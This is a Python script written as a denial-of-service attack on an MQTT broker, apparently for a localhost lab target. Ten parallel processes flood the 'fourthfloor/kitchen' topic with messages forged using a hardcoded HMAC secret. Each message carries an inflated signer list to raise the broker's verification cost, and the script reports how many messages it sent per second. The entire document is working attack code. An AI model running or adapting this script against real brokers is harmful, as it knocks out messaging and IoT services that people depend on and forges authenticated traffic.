import paho.mqtt.client as mqtt
import json
import multiprocessing
import time
import random
import hmac
import hashlib

# --- Configuration ---
VICTIM_HOST = "127.0.0.1"
VICTIM_PORT = 1887
TARGET_TOPIC = "fourthfloor/kitchen"
MESSAGE_COUNT_PER_PROCESS = 1000
# Use a number of processes close to the number of CPU cores you have
PROCESS_COUNT = 10 

AUTHORIZED_CLIENT_ID = "C8"
HMAC_SECRET_KEY = b"4c1c4d7e2b9f7a0e8b6d3e5f1a2c7b4d"
SIGNER_IDS = ["B0", "B1", "B2", "B3", "B5", "B6", "B7"]

def flood_broker(process_id):
    # Each process gets its own client
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"dos-attacker-{process_id}-{random.randint(1000, 9999)}")
    client.connect(VICTIM_HOST, VICTIM_PORT, 60)
    client.loop_start()

    for i in range(MESSAGE_COUNT_PER_PROCESS):
        original_signer = random.choice(SIGNER_IDS)

        # Create a complex signer list to make the calculation more expensive
        signers_list = [original_signer]
        for _ in range(20): # Add 5 more random signers
            signers_list.append(random.choice(SIGNER_IDS))

        payload_json = {
            "b": original_signer,
            "c": AUTHORIZED_CLIENT_ID,
            "message": "dos",
            "S": signers_list
        }
        
        payload_str_no_hmac = json.dumps(payload_json, separators=(',', ':'))
        new_hmac = hmac.new(HMAC_SECRET_KEY, payload_str_no_hmac.encode(), hashlib.sha256).hexdigest()
        payload_json["hmac"] = new_hmac
        
        client.publish(TARGET_TOPIC, json.dumps(payload_json))
    
    client.loop_stop()
    client.disconnect()

# --- Main Execution ---
if __name__ == "__main__":
    print(f"[*] Starting high-intensity DoS attack with {PROCESS_COUNT} parallel processes.")
    start_time = time.time()

    # Create a pool of worker processes to bypass the GIL
    with multiprocessing.Pool(processes=PROCESS_COUNT) as pool:
        # Map the worker function to a list of process IDs
        pool.map(flood_broker, range(PROCESS_COUNT))

    duration = time.time() - start_time
    total_messages = PROCESS_COUNT * MESSAGE_COUNT_PER_PROCESS
    print(f"\n[*] Attack complete. Sent {total_messages} messages in {duration:.2f} seconds.")
    print(f"[*] Average messages per second: {total_messages / duration:.2f}")